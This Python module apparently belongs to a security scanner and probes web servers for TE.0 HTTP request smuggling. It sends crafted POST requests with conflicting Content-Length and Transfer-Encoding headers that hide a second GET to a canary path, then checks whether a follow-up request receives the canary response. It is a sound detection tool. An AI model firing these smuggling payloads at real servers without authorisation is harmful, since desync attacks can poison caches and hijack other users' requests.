"""TE.0 detection: front-end ignores or misparses Transfer-Encoding."""

from socket import (create_connection, socket, timeout as SocketTimeout)
from ssl import CERT_NONE, create_default_context
from typing import Dict, List

from lib.canary import CanaryGenerator


DRAIN_TIMEOUT = 0.6


class TEZeroProbe:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    def _pair_test(self, prefix: bytes, endpoint: str, host_header: str,
                   canary_path: str) -> Dict[str, object]:
        victim = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        hits = 0
        pipelined = 0
        attempts = 3
        for _ in range(attempts):
            try:
                sock = self._connect()
                sock.sendall(prefix)
                early = self._drain(sock)
                if self.canary.validate(early, canary_path):
                    pipelined += 1
                    sock.close()
                    continue
                sock.sendall(victim)
                late = self._drain(sock)
                sock.close()
                if self.canary.validate(late, canary_path):
                    hits += 1
            except OSError:
                pass
        return {
            "hits": hits,
            "attempts": attempts,
            "pipelined": pipelined,
            "desync_suspected": hits >= 2,
            "raw": prefix,
        }

    def probe_te0_ignore(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        body = "0\r\n\r\n" + smuggled
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: {len(body.encode('latin-1'))}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        ).encode("latin-1", errors="replace")
        result = self._pair_test(prefix, endpoint, host_header, canary_path)
        result["type"] = "TE.0_IGNORE"
        result["canary_path"] = canary_path
        return result

    def probe_te0_case(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        body = "0\r\n\r\n" + smuggled
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: {len(body.encode('latin-1'))}\r\n"
            f"Transfer-Encoding: Chunked\r\n"
            f"\r\n"
            f"{body}"
        ).encode("latin-1", errors="replace")
        result = self._pair_test(prefix, endpoint, host_header, canary_path)
        result["type"] = "TE.0_CASE"
        result["canary_path"] = canary_path
        return result

    def run_all(self, endpoint: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_te0_ignore, self.probe_te0_case):
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "desync_suspected": False})
        return results